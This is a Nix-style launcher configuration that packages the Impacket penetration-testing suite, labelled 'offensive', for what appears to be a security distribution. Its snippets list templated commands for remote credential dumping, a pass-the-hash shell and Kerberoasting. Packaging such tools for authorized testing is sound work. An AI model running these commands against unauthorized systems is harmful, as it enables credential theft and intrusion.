# Python tools for Windows protocols — run impacket-<tool>
{ bodies }:
{
  package = p: p.python313Packages.impacket;
  name = "Impacket";
  genericName = "Windows Post-Exploitation Suite";
  comment = "Python tools for Windows protocols — run impacket-<tool>";
  description = ''
    Impacket is a collection of Python implementations of Windows network
    protocols — SMB, Kerberos, DCE/RPC and more — packaged as individual
    `impacket-<tool>` scripts for credential dumping, lateral movement and
    ticket abuse. `impacket-<Tab>` lists every script on `PATH`.
  '';
  docs = "https://github.com/fortra/impacket";
  snippets = [
    {
      label = "Dump SAM/LSA secrets remotely";
      command = "impacket-secretsdump <domain>/<user>:<password>@<IP>";
    }
    {
      label = "Pass-the-hash shell";
      command = "impacket-psexec <domain>/<user>@<IP> -hashes <LMHASH>:<NTHASH>";
    }
    {
      label = "Kerberoast every SPN account";
      command = "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request";
    }
  ];
  exec = "konsole";
  launch = "gui"; # runs directly
  mark = {
    class = "offensive";
    body = bodies.impacket;
  };
}
